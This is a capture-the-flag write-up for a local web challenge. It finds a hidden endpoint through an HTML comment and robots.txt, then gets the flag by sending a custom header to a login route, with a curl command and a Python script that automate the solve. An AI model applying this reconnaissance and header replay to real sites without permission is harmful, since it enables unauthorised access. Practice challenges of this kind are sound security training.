# Robots and headers

## Overview
By analyzing html we can notice the following comment: ``` <!-- For web crawlers: Check /robots.txt for guidance --> ```, and here in ``` /robots.txt ``` we can see an interesting endpoint, which is ``` /nothing_interesting ```. Visiting that page provides the instructions to obtain the flag.

## Exploit
Bash:
```bash
curl -X POST -H "X-Key-Header: My_key_is_not_so_secret" http://127.0.0.1:6001/login
```

Python:
```py
import requests
from bs4 import BeautifulSoup

url = "http://127.0.0.1:6001"

endpoint = requests.get(url + "/robots.txt").text.split(": ")[-1].strip()

r = requests.get(url + endpoint)
p_tags = BeautifulSoup(r.text, "html.parser").find_all("p")[1:]

custom_key = p_tags[0].get_text().split(": ")[-1]
custom_value = p_tags[1].get_text().split(": ")[-1]

flag = requests.post(url + "/login", headers={custom_key: custom_value}).text
print(flag)
```